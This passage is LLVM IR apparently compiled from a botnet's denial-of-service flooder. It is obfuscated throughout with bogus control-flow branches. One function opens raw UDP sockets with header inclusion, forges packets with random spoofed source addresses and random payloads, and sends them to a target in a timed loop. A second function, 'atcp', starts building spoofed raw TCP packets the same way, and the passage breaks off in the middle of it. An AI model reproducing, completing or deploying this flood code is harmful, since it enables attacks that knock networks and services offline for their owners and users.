  %236 = icmp eq i32 %235, 0
  %237 = icmp slt i32 %232, 10
  %238 = or i1 %236, %237
  br i1 %238, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %230
  %239 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %239, i32* %19, align 4
  %240 = load i32, i32* %19, align 4
  %241 = icmp ne i32 %240, 0
  %242 = load i32, i32* @x.37
  %243 = load i32, i32* @y.38
  %244 = sub i32 %242, 1
  %245 = mul i32 %242, %244
  %246 = urem i32 %245, 2
  %247 = icmp eq i32 %246, 0
  %248 = icmp slt i32 %243, 10
  %249 = or i1 %247, %248
  br i1 %249, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %241, label %251, label %250

; <label>:250:                                    ; preds = %originalBBpart251
  br label %535

; <label>:251:                                    ; preds = %originalBBpart251
  store i32 1, i32* %20, align 4
  %252 = load i32, i32* %19, align 4
  %253 = bitcast i32* %20 to i8*
  %254 = call i32 @setsockopt(i32 %252, i32 0, i32 3, i8* %253, i32 4) #6
  %255 = icmp slt i32 %254, 0
  br i1 %255, label %256, label %273

; <label>:256:                                    ; preds = %251
  %257 = load i32, i32* @x.37
  %258 = load i32, i32* @y.38
  %259 = sub i32 %257, 1
  %260 = mul i32 %257, %259
  %261 = urem i32 %260, 2
  %262 = icmp eq i32 %261, 0
  %263 = icmp slt i32 %258, 10
  %264 = or i1 %262, %263
  br i1 %264, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %256
  %265 = load i32, i32* @x.37
  %266 = load i32, i32* @y.38
  %267 = sub i32 %265, 1
  %268 = mul i32 %265, %267
  %269 = urem i32 %268, 2
  %270 = icmp eq i32 %269, 0
  %271 = icmp slt i32 %266, 10
  %272 = or i1 %270, %271
  br i1 %272, label %originalBBpart255, label %originalBB53alteredBB

originalBBpart255:                                ; preds = %originalBB53
  br label %535

; <label>:273:                                    ; preds = %251
  store i32 50, i32* %21, align 4
  br label %274

; <label>:274:                                    ; preds = %278, %273
  %275 = load i32, i32* %21, align 4
  %276 = add nsw i32 %275, -1
  store i32 %276, i32* %21, align 4
  %277 = icmp ne i32 %275, 0
  br i1 %277, label %278, label %283

; <label>:278:                                    ; preds = %274
  %279 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %280 = call i32 @rand_cmwc()
  %281 = xor i32 %279, %280
  call void @srand(i32 %281) #6
  %282 = call i32 @rand() #6
  call void @init_rand(i32 %282)
  br label %274

; <label>:283:                                    ; preds = %274
  %284 = load i32, i32* %10, align 4
  %285 = icmp eq i32 %284, 0
  br i1 %285, label %286, label %287

; <label>:286:                                    ; preds = %283
  store i32 0, i32* %22, align 4
  br label %293

; <label>:287:                                    ; preds = %283
  %288 = load i32, i32* %10, align 4
  %289 = sub nsw i32 32, %288
  %290 = shl i32 1, %289
  %291 = sub nsw i32 %290, 1
  %292 = xor i32 %291, -1
  store i32 %292, i32* %22, align 4
  br label %293

; <label>:293:                                    ; preds = %287, %286
  %294 = load i32, i32* %11, align 4
  %295 = sext i32 %294 to i64
  %296 = add i64 28, %295
  %297 = call i8* @llvm.stacksave()
  store i8* %297, i8** %23, align 8
  %298 = alloca i8, i64 %296, align 16
  %299 = bitcast i8* %298 to %struct.iphdr*
  store %struct.iphdr* %299, %struct.iphdr** %24, align 8
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = bitcast %struct.iphdr* %300 to i8*
  %302 = getelementptr i8, i8* %301, i64 20
  %303 = bitcast i8* %302 to %struct.udphdr*
  store %struct.udphdr* %303, %struct.udphdr** %25, align 8
  %304 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %305 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %306 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 4
  %308 = load i32, i32* %22, align 4
  %309 = call i32 @getRandomIP(i32 %308)
  %310 = call i32 @htonl(i32 %309) #9
  %311 = load i32, i32* %11, align 4
  %312 = sext i32 %311 to i64
  %313 = add i64 8, %312
  %314 = trunc i64 %313 to i32
  call void @makeIPPacket(%struct.iphdr* %304, i32 %307, i32 %310, i8 zeroext 17, i32 %314)
  %315 = load i32, i32* %11, align 4
  %316 = sext i32 %315 to i64
  %317 = add i64 8, %316
  %318 = trunc i64 %317 to i16
  %319 = call zeroext i16 @htons(i16 zeroext %318) #9
  %320 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %321 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %320, i32 0, i32 0
  %322 = bitcast %union.anon.3* %321 to %struct.anon.4*
  %323 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %322, i32 0, i32 2
  store i16 %319, i16* %323, align 2
  %324 = call i32 @rand_cmwc()
  %325 = trunc i32 %324 to i16
  %326 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %327 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %326, i32 0, i32 0
  %328 = bitcast %union.anon.3* %327 to %struct.anon.4*
  %329 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %328, i32 0, i32 0
  store i16 %325, i16* %329, align 2
  %330 = load i32, i32* %8, align 4
  %331 = icmp eq i32 %330, 0
  br i1 %331, label %332, label %334

; <label>:332:                                    ; preds = %293
  %333 = call i32 @rand_cmwc()
  br label %339

; <label>:334:                                    ; preds = %293
  %335 = load i32, i32* %8, align 4
  %336 = trunc i32 %335 to i16
  %337 = call zeroext i16 @htons(i16 zeroext %336) #9
  %338 = zext i16 %337 to i32
  br label %339

; <label>:339:                                    ; preds = %334, %332
  %340 = phi i32 [ %333, %332 ], [ %338, %334 ]
  %341 = trunc i32 %340 to i16
  %342 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %343 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %342, i32 0, i32 0
  %344 = bitcast %union.anon.3* %343 to %struct.anon.4*
  %345 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %344, i32 0, i32 1
  store i16 %341, i16* %345, align 2
  %346 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %347 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %346, i32 0, i32 0
  %348 = bitcast %union.anon.3* %347 to %struct.anon.4*
  %349 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %348, i32 0, i32 3
  store i16 0, i16* %349, align 2
  %350 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %351 = bitcast %struct.udphdr* %350 to i8*
  %352 = getelementptr inbounds i8, i8* %351, i64 8
  %353 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %352, i32 %353)
  %354 = bitcast i8* %298 to i16*
  %355 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i32 0, i32 2
  %357 = load i16, i16* %356, align 2
  %358 = zext i16 %357 to i32
  %359 = call zeroext i16 @csum(i16* %354, i32 %358)
  %360 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %361 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %360, i32 0, i32 7
  store i16 %359, i16* %361, align 2
  %362 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %363 = load i32, i32* %9, align 4
  %364 = add nsw i32 %362, %363
  store i32 %364, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %365

; <label>:365:                                    ; preds = %514, %originalBBpart279, %339
  %366 = load i32, i32* @x.37
  %367 = load i32, i32* @y.38
  %368 = sub i32 %366, 1
  %369 = mul i32 %366, %368
  %370 = urem i32 %369, 2
  %371 = icmp eq i32 %370, 0
  %372 = icmp slt i32 %367, 10
  %373 = or i1 %371, %372
  br i1 %373, label %originalBB57, label %originalBB57alteredBB

originalBB57:                                     ; preds = %originalBB57alteredBB, %365
  %374 = load i32, i32* @x.37
  %375 = load i32, i32* @y.38
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBBpart259, label %originalBB57alteredBB

originalBBpart259:                                ; preds = %originalBB57
  br label %382

; <label>:382:                                    ; preds = %originalBBpart259
  %383 = load i32, i32* %19, align 4
  %384 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %385 = call i64 @sendto(i32 %383, i8* %298, i64 %296, i32 0, %struct.sockaddr* %384, i32 16)
  %386 = call i32 @rand_cmwc()
  %387 = trunc i32 %386 to i16
  %388 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %389 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %388, i32 0, i32 0
  %390 = bitcast %union.anon.3* %389 to %struct.anon.4*
  %391 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %390, i32 0, i32 0
  store i16 %387, i16* %391, align 2
  %392 = load i32, i32* %8, align 4
  %393 = icmp eq i32 %392, 0
  br i1 %393, label %394, label %412

; <label>:394:                                    ; preds = %382
  %395 = load i32, i32* @x.37
  %396 = load i32, i32* @y.38
  %397 = sub i32 %395, 1
  %398 = mul i32 %395, %397
  %399 = urem i32 %398, 2
  %400 = icmp eq i32 %399, 0
  %401 = icmp slt i32 %396, 10
  %402 = or i1 %400, %401
  br i1 %402, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %394
  %403 = call i32 @rand_cmwc()
  %404 = load i32, i32* @x.37
  %405 = load i32, i32* @y.38
  %406 = sub i32 %404, 1
  %407 = mul i32 %404, %406
  %408 = urem i32 %407, 2
  %409 = icmp eq i32 %408, 0
  %410 = icmp slt i32 %405, 10
  %411 = or i1 %409, %410
  br i1 %411, label %originalBBpart263, label %originalBB61alteredBB

originalBBpart263:                                ; preds = %originalBB61
  br label %417

; <label>:412:                                    ; preds = %382
  %413 = load i32, i32* %8, align 4
  %414 = trunc i32 %413 to i16
  %415 = call zeroext i16 @htons(i16 zeroext %414) #9
  %416 = zext i16 %415 to i32
  br label %417

; <label>:417:                                    ; preds = %412, %originalBBpart263
  %418 = phi i32 [ %403, %originalBBpart263 ], [ %416, %412 ]
  %419 = load i32, i32* @x.37
  %420 = load i32, i32* @y.38
  %421 = sub i32 %419, 1
  %422 = mul i32 %419, %421
  %423 = urem i32 %422, 2
  %424 = icmp eq i32 %423, 0
  %425 = icmp slt i32 %420, 10
  %426 = or i1 %424, %425
  br i1 %426, label %originalBB65, label %originalBB65alteredBB

originalBB65:                                     ; preds = %originalBB65alteredBB, %417
  %427 = trunc i32 %418 to i16
  %428 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %429 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %428, i32 0, i32 0
  %430 = bitcast %union.anon.3* %429 to %struct.anon.4*
  %431 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %430, i32 0, i32 1
  store i16 %427, i16* %431, align 2
  %432 = call i32 @rand_cmwc()
  %433 = trunc i32 %432 to i16
  %434 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  store i16 %433, i16* %435, align 4
  %436 = load i32, i32* %22, align 4
  %437 = call i32 @getRandomIP(i32 %436)
  %438 = call i32 @htonl(i32 %437) #9
  %439 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 8
  store i32 %438, i32* %440, align 4
  %441 = bitcast i8* %298 to i16*
  %442 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 2
  %444 = load i16, i16* %443, align 2
  %445 = zext i16 %444 to i32
  %446 = call zeroext i16 @csum(i16* %441, i32 %445)
  %447 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %448 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %447, i32 0, i32 7
  store i16 %446, i16* %448, align 2
  %449 = load i32, i32* %27, align 4
  %450 = load i32, i32* %14, align 4
  %451 = icmp eq i32 %449, %450
  %452 = load i32, i32* @x.37
  %453 = load i32, i32* @y.38
  %454 = sub i32 %452, 1
  %455 = mul i32 %452, %454
  %456 = urem i32 %455, 2
  %457 = icmp eq i32 %456, 0
  %458 = icmp slt i32 %453, 10
  %459 = or i1 %457, %458
  br i1 %459, label %originalBBpart267, label %originalBB65alteredBB

originalBBpart267:                                ; preds = %originalBB65
  br i1 %451, label %460, label %514

; <label>:460:                                    ; preds = %originalBBpart267
  %461 = load i32, i32* @x.37
  %462 = load i32, i32* @y.38
  %463 = sub i32 %461, 1
  %464 = mul i32 %461, %463
  %465 = urem i32 %464, 2
  %466 = icmp eq i32 %465, 0
  %467 = icmp slt i32 %462, 10
  %468 = or i1 %466, %467
  br i1 %468, label %originalBB69, label %originalBB69alteredBB

originalBB69:                                     ; preds = %originalBB69alteredBB, %460
  %469 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %470 = load i32, i32* %26, align 4
  %471 = icmp sgt i32 %469, %470
  %472 = load i32, i32* @x.37
  %473 = load i32, i32* @y.38
  %474 = sub i32 %472, 1
  %475 = mul i32 %472, %474
  %476 = urem i32 %475, 2
  %477 = icmp eq i32 %476, 0
  %478 = icmp slt i32 %473, 10
  %479 = or i1 %477, %478
  br i1 %479, label %originalBBpart271, label %originalBB69alteredBB

originalBBpart271:                                ; preds = %originalBB69
  br i1 %471, label %480, label %497

; <label>:480:                                    ; preds = %originalBBpart271
  %481 = load i32, i32* @x.37
  %482 = load i32, i32* @y.38
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB73, label %originalBB73alteredBB

originalBB73:                                     ; preds = %originalBB73alteredBB, %480
  %489 = load i32, i32* @x.37
  %490 = load i32, i32* @y.38
  %491 = sub i32 %489, 1
  %492 = mul i32 %489, %491
  %493 = urem i32 %492, 2
  %494 = icmp eq i32 %493, 0
  %495 = icmp slt i32 %490, 10
  %496 = or i1 %494, %495
  br i1 %496, label %originalBBpart275, label %originalBB73alteredBB

originalBBpart275:                                ; preds = %originalBB73
  br label %517

; <label>:497:                                    ; preds = %originalBBpart271
  %498 = load i32, i32* @x.37
  %499 = load i32, i32* @y.38
  %500 = sub i32 %498, 1
  %501 = mul i32 %498, %500
  %502 = urem i32 %501, 2
  %503 = icmp eq i32 %502, 0
  %504 = icmp slt i32 %499, 10
  %505 = or i1 %503, %504
  br i1 %505, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %497
  store i32 0, i32* %27, align 4
  %506 = load i32, i32* @x.37
  %507 = load i32, i32* @y.38
  %508 = sub i32 %506, 1
  %509 = mul i32 %506, %508
  %510 = urem i32 %509, 2
  %511 = icmp eq i32 %510, 0
  %512 = icmp slt i32 %507, 10
  %513 = or i1 %511, %512
  br i1 %513, label %originalBBpart279, label %originalBB77alteredBB

originalBBpart279:                                ; preds = %originalBB77
  br label %365

; <label>:514:                                    ; preds = %originalBBpart267
  %515 = load i32, i32* %27, align 4
  %516 = add i32 %515, 1
  store i32 %516, i32* %27, align 4
  br label %365

; <label>:517:                                    ; preds = %originalBBpart275
  %518 = load i32, i32* @x.37
  %519 = load i32, i32* @y.38
  %520 = sub i32 %518, 1
  %521 = mul i32 %518, %520
  %522 = urem i32 %521, 2
  %523 = icmp eq i32 %522, 0
  %524 = icmp slt i32 %519, 10
  %525 = or i1 %523, %524
  br i1 %525, label %originalBB81, label %originalBB81alteredBB

originalBB81:                                     ; preds = %originalBB81alteredBB, %517
  %526 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %526)
  %527 = load i32, i32* @x.37
  %528 = load i32, i32* @y.38
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBBpart283, label %originalBB81alteredBB

originalBBpart283:                                ; preds = %originalBB81
  br label %535

; <label>:535:                                    ; preds = %originalBBpart283, %originalBBpart255, %250, %229, %originalBBpart212, %originalBBpart28, %61
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %35
  %536 = load i32, i32* %8, align 4
  %537 = trunc i32 %536 to i16
  %538 = call zeroext i16 @htons(i16 zeroext %537) #9
  %539 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %538, i16* %539, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %68
  %540 = call i32 @socket(i32 2, i32 2, i32 17) #6
  store i32 %540, i32* %15, align 4
  %541 = load i32, i32* %15, align 4
  %542 = icmp ne i32 %541, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %112
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %129
  %543 = load i8*, i8** %16, align 8
  %544 = load i32, i32* %11, align 4
  %_ = sub i32 %544, 1
  %gen = mul i32 %_, 1
  %_15 = shl i32 %544, 1
  %_16 = sub i32 %544, 1
  %gen17 = mul i32 %_16, 1
  %_18 = sub i32 %544, 1
  %gen19 = mul i32 %_18, 1
  %_20 = shl i32 %544, 1
  %_21 = sub i32 %544, 1
  %gen22 = mul i32 %_21, 1
  %_23 = shl i32 %544, 1
  %_24 = sub i32 0, %544
  %gen25 = add i32 %_24, 1
  %545 = add nsw i32 %544, 1
  %546 = sext i32 %545 to i64
  call void @llvm.memset.p0i8.i64(i8* %543, i8 0, i64 %546, i32 1, i1 false)
  %547 = load i8*, i8** %16, align 8
  %548 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %547, i32 %548)
  %549 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %550 = load i32, i32* %9, align 4
  %_26 = sub i32 %549, %550
  %gen27 = mul i32 %_26, %550
  %_28 = shl i32 %549, %550
  %_29 = shl i32 %549, %550
  %_30 = sub i32 %549, %550
  %gen31 = mul i32 %_30, %550
  %_32 = sub i32 0, %549
  %gen33 = add i32 %_32, %550
  %551 = add nsw i32 %549, %550
  store i32 %551, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %originalBB14

originalBB37alteredBB:                            ; preds = %originalBB37, %155
  %552 = load i32, i32* %15, align 4
  %553 = load i8*, i8** %16, align 8
  %554 = load i32, i32* %11, align 4
  %555 = sext i32 %554 to i64
  %556 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %557 = call i64 @sendto(i32 %552, i8* %553, i64 %555, i32 0, %struct.sockaddr* %556, i32 16)
  %558 = load i32, i32* %18, align 4
  %559 = load i32, i32* %14, align 4
  %560 = icmp eq i32 %558, %559
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %184
  %561 = call i32 @rand_cmwc()
  %562 = trunc i32 %561 to i16
  %563 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %562, i16* %563, align 2
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %209
  store i32 0, i32* %18, align 4
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %230
  %564 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %564, i32* %19, align 4
  %565 = load i32, i32* %19, align 4
  %566 = icmp ne i32 %565, 0
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %256
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %365
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %394
  %567 = call i32 @rand_cmwc()
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %417
  %568 = trunc i32 %418 to i16
  %569 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %570 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %569, i32 0, i32 0
  %571 = bitcast %union.anon.3* %570 to %struct.anon.4*
  %572 = getelementptr inbounds %struct.anon.4, %struct.anon.4* %571, i32 0, i32 1
  store i16 %568, i16* %572, align 2
  %573 = call i32 @rand_cmwc()
  %574 = trunc i32 %573 to i16
  %575 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %576 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %575, i32 0, i32 3
  store i16 %574, i16* %576, align 4
  %577 = load i32, i32* %22, align 4
  %578 = call i32 @getRandomIP(i32 %577)
  %579 = call i32 @htonl(i32 %578) #9
  %580 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %581 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %580, i32 0, i32 8
  store i32 %579, i32* %581, align 4
  %582 = bitcast i8* %298 to i16*
  %583 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %584 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %583, i32 0, i32 2
  %585 = load i16, i16* %584, align 2
  %586 = zext i16 %585 to i32
  %587 = call zeroext i16 @csum(i16* %582, i32 %586)
  %588 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %589 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %588, i32 0, i32 7
  store i16 %587, i16* %589, align 2
  %590 = load i32, i32* %27, align 4
  %591 = load i32, i32* %14, align 4
  %592 = icmp eq i32 %590, %591
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %460
  %593 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %594 = load i32, i32* %26, align 4
  %595 = icmp sgt i32 %593, %594
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %480
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %497
  store i32 0, i32* %27, align 4
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %517
  %596 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %596)
  br label %originalBB81
}

declare i32 @time(...) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #3

; Function Attrs: nounwind
declare i32 @rand() #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #6

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #6

; Function Attrs: noinline nounwind uwtable
define void @atcp(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #9
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i32, i32* @x.39
  %41 = load i32, i32* @y.40
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i8*, i8** %8, align 8
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %50 = call i32 @getHost(i8* %48, %struct.in_addr* %49)
  %51 = icmp ne i32 %50, 0
  %52 = load i32, i32* @x.39
  %53 = load i32, i32* @y.40
  %54 = sub i32 %52, 1
  %55 = mul i32 %52, %54
  %56 = urem i32 %55, 2
  %57 = icmp eq i32 %56, 0
  %58 = icmp slt i32 %53, 10
  %59 = or i1 %57, %58
  br i1 %59, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %51, label %60, label %61

; <label>:60:                                     ; preds = %originalBBpart2
  br label %588

; <label>:61:                                     ; preds = %originalBBpart2
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %64, i32* %17, align 4
  %65 = load i32, i32* %17, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %68, label %67

; <label>:67:                                     ; preds = %61
  br label %588

; <label>:68:                                     ; preds = %61
  store i32 1, i32* %18, align 4
  %69 = load i32, i32* %17, align 4
  %70 = bitcast i32* %18 to i8*
  %71 = call i32 @setsockopt(i32 %69, i32 0, i32 3, i8* %70, i32 4) #6
  %72 = icmp slt i32 %71, 0
  br i1 %72, label %73, label %90

; <label>:73:                                     ; preds = %68
  %74 = load i32, i32* @x.39
  %75 = load i32, i32* @y.40
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %73
  %82 = load i32, i32* @x.39
  %83 = load i32, i32* @y.40
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %588

; <label>:90:                                     ; preds = %68
  %91 = load i32, i32* %11, align 4
  %92 = icmp eq i32 %91, 0
  br i1 %92, label %93, label %94

; <label>:93:                                     ; preds = %90
  store i32 0, i32* %19, align 4
  br label %100

; <label>:94:                                     ; preds = %90
  %95 = load i32, i32* %11, align 4
  %96 = sub nsw i32 32, %95
  %97 = shl i32 1, %96
  %98 = sub nsw i32 %97, 1
  %99 = xor i32 %98, -1
  store i32 %99, i32* %19, align 4
  br label %100

; <label>:100:                                    ; preds = %94, %93
  %101 = load i32, i32* %13, align 4
  %102 = sext i32 %101 to i64
  %103 = add i64 40, %102
  %104 = call i8* @llvm.stacksave()
  store i8* %104, i8** %20, align 8
  %105 = alloca i8, i64 %103, align 16
  %106 = bitcast i8* %105 to %struct.iphdr*
  store %struct.iphdr* %106, %struct.iphdr** %21, align 8
  %107 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %108 = bitcast %struct.iphdr* %107 to i8*
  %109 = getelementptr i8, i8* %108, i64 20
  %110 = bitcast i8* %109 to %struct.tcphdr*
  store %struct.tcphdr* %110, %struct.tcphdr** %22, align 8
  %111 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  %114 = load i32, i32* %113, align 4
  %115 = load i32, i32* %19, align 4
  %116 = call i32 @getRandomIP(i32 %115)
  %117 = call i32 @htonl(i32 %116) #9
  %118 = load i32, i32* %13, align 4
  %119 = sext i32 %118 to i64
  %120 = add i64 20, %119
  %121 = trunc i64 %120 to i32
  call void @makeIPPacket(%struct.iphdr* %111, i32 %114, i32 %117, i8 zeroext 6, i32 %121)
  %122 = call i32 @rand_cmwc()
  %123 = trunc i32 %122 to i16
  %124 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %125 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %124, i32 0, i32 0
  %126 = bitcast %union.anon.1* %125 to %struct.anon.2*
